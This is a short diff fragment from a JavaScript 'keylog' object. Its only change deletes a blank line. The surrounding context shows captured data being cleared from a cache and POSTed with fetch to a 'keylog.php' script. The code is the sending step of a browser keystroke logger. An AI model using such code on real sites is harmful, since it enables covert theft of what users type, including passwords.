@@ -24,7 +24,6 @@ let keylog = {
             keylog.cache = []
 
             // send this info to php script
-
             fetch("keylog.php",{
                 method:'POST',
                 body:data
